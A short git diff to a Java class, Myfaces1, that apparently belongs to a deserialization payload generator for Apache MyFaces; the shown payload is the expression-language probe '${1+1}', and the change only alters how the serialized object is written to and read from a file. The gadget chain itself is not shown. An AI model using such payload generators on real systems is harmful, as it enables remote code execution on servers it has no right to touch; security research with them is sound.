@@ -21,8 +21,6 @@ import java.util.HashMap;
  */
 public class Myfaces1 {
 
-	public static String fileName = "Myfaces1.bin";
-
 	public static String payload = "${1+1}";
 
 	public static Object generatePayload(String payloads) throws Exception {
@@ -60,8 +58,8 @@ public class Myfaces1 {
 
 
 	public static void main(String[] args) throws Exception {
-		SerializeUtil.writeObjectToFile(generatePayload(payload), fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(generatePayload(payload));
+		SerializeUtil.readFileObject();
 	}
 
 }
